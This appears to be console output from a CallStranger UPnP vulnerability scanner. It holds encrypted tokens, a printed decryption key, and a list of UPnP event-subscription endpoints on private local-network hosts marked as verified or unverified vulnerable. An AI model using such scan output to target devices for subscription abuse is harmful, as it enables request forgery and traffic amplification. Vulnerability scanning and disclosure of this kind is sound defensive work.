    gAAAAABe3eWNlKb5TTOnwnyQPA3au856DTuiCwyYdtGcCpSYHFNCBJ4j1Tr-1HbnLV59m9kHppA6GYRZpECoT-2s7MAwIpjvcllbbCdc0ORHoA40jDBwzdqECjLPCZnM1GncnOgfSFvfTYnbOMbnbYlY825Oi0f_ZA==
    gAAAAABe3eWNBpQ_jvIj1auFPntVMxiNgqCAMMLd4m960P-5nA87VRRR-cCDjUthjQ1BaiXYGw9lJ2QS6u6Iq1jl_ugpE8ef7hoeuK9oT33wDIjm9cST_xj4IYW_S2SddtSsHhIwtkMX
    gAAAAABe3eWNk6hSWo8XmOpY-kvAsWA4ztVyP71dJy0Pit2GWl9lH5u7CiU8selzo2uSXmRczZYz2MMwbF45En3rkfmhk5JkRHRQOpytn1GhDClqevh-S6UBAiDiRvcnBFRhAyb-C6mjvOCbjpZ1amIaQs5wxPFH9OSCT6aeIp5BRPeCLbk0XsbExDvq7Kilmf0X-CeoJxwrOlzhEFt3aA9UbzrP5WKq_6KAVtxk_rDMemINYtBsjMwyAwSFIr2duohzAsL7pe-f
    gAAAAABe3eWNXMZtJ2FXZUd6l9fPF4W6zyJ-jSIV7-YnsOAuS_3P8Qg_J59XfUp5l5SFUFzL5d_SyCFtTENW2sMrQZjGt5ZGZBMjmZfnNjNfmwpJwN9ZjKK_NCy4NRV69ipJG3E5evaeEbg4cOh2iwM_eCMyMdPzYD4MNBKaDFHG3QTUpPItjGdX169O3A77VaLH61OV0QSFmUcYro7yYCGRrj1B3G6Gl9vHPXUxfVZN5GqhgW2sHvZmTZUs7UKLVgzoEaS2Oy6h
    gAAAAABe3eWNdiaamddL1mXEEsXlJQRwPTTyy1vsWMFfYS02X8or9Rk8oS_nQPzDJzDYhn2UrwRgdW1evZRz-lYAmFqZnyb6R6JH0kFpd5Ds36KpFssmKRwTUBaRv3LjYl5SDt7r4Q1TCeGuKRHAPOQ3nKv5xovNNtNz38k-escgkwW9oRBPQAFnLZxQPwh3eb8bfLUl_1nxwZsdPKfB8Fp_wOjNezjXql9ljwtkzMy2Rzas9D9T9AoydyV_I60qyjJVNHy4As6T
    gAAAAABe3eWNSafCBN8pkwe2BMPrzwV1SzOUWciHVwYbPyTt1tut-PEkaQ2oDjS0yz0hd0t02pD35_DIkHhV_XRaGq5KMMdo6nnJ5sFjvhQ0uAilJF-4doO7DdWww7YNyZdo4258jmLQ2YRLSXodwQJXUlvVJN3pJIe4e9m9MjCbT214I61Ue14euKxx470mSpvpZCnVeQYnnUoS8SKkXibFVmJ-qpW4Ep3x8Xbb34GnSXe01OJpvf39uYZGsuKz0paeVgJTbnLl
    gAAAAABe3eWN5YhNQVAQagPd3LpBocI7jwkv8caPKiPAfeeD5X1uNSFZ7mfTWB3QwFcsVcbFln5JrVD3mlvHzD3UrYUC0VK_uRHd_c2K-m6h_Od2NUNB1dduNNMh7rMa0a2Wlq8WxxZn
    
    
    Decyripting vulnerable services with key: b'yy8e8uAg4kV-oSAuvdxrJBPwxMHx0JuEm1BsYXCzBYE='
    
    Verified vulnerable services:
    1:      http://192.168.1.22:2870/event/RenderingControl
    2:      http://192.168.1.22:2870/event/ConnectionManager
    3:      http://192.168.1.22:2870/event/AVTransport
    4:      http://192.168.1.40:2870/RenderingControl/event
    5:      http://192.168.1.40:2870/ConnectionManager/event
    6:      http://192.168.1.40:2870/AVTransport/event
    7:      http://192.168.1.1:37215/evt/Layer3Forwarding_1
    8:      http://192.168.1.40:2870/RenderingControl/event
    9:      http://192.168.1.40:2870/ConnectionManager/event
    10:     http://192.168.1.40:2870/AVTransport/event
    11:     http://192.168.1.31:2869/upnphost/udhisapi.dll?event=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695+urn:upnp-org:serviceId:RenderingControl
    12:     http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:RenderingControl
    13:     http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:AVTransport
    14:     http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:ConnectionManager
    15:     http://192.168.1.1:37215/evt/WANPPPConnection_1
    
    Unverified  services:
    1:      http://192.168.1.1:37215/evt/WANCommonInterfaceConfig_1
    2:      http://192.168.1.1:37215/evt/WANEthernetLinkConfig_1
    3:      http://192.168.1.1:37215/evt/LANHostConfigManagement_1
    4:      http://192.168.1.22:49154/upnp/event/ContentDirectoryNmsO
    5:      http://192.168.1.22:49154/upnp/event/ConnectionManagerNmsO
    
            Visit https://www.CallStranger.com for updates

